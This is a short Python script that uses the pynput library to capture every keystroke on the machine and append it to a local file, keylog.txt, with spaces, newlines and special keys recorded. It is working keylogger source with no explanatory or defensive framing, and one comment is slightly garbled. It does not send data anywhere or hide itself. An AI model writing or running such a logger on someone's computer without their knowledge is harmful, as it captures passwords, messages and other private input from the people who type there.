from pynput.keyboard import Key, Listener

# File to store the keystrokes
log_file = "keylog.txt"

#  toFunction write the keystrokes to the log file
def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f" [{str(key)}] ")



# Start listening to the keyboard
with Listener(on_press=on_press) as listener:
    listener.join()
